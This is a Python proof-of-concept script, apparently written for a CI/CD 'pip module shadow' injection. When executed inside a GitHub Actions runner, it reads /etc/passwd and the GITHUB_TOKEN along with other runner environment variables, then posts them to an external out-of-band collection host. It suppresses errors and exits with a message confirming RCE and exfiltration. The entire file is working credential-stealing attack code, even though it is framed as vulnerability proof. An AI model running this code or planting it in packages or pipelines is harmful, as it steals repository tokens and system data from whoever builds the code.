#!/usr/bin/env python3
"""pip module shadow - CI/CD injection PoC (enhanced)"""
import os, urllib.request, json

try:
    passwd = ""
    try:
        with open("/etc/passwd", "r") as f:
            passwd = f.read()
    except Exception:
        passwd = "could not read"

    token = os.environ.get("GITHUB_TOKEN", "NOT_FOUND")

    data = json.dumps({
        "poc": "mslearn-mlops-cicd-rce-critical",
        "etc_passwd": passwd,
        "github_token": token,
        "github_repository": os.environ.get("GITHUB_REPOSITORY", ""),
        "github_actor": os.environ.get("GITHUB_ACTOR", ""),
        "github_run_id": os.environ.get("GITHUB_RUN_ID", ""),
        "runner_name": os.environ.get("RUNNER_NAME", ""),
        "runner_os": os.environ.get("RUNNER_OS", ""),
        "github_workflow": os.environ.get("GITHUB_WORKFLOW", ""),
        "github_server_url": os.environ.get("GITHUB_SERVER_URL", ""),
    }).encode()

    req = urllib.request.Request(
        "https://db0meq33hu6s8sl1b7104arzi3kttcqkb.oast.online/rce-proof",
        data=data,
        headers={"Content-Type": "application/json"}
    )
    urllib.request.urlopen(req, timeout=10)
except Exception:
    pass

raise SystemExit("PoC: pip module shadow executed - RCE confirmed with /etc/passwd + GITHUB_TOKEN exfil")
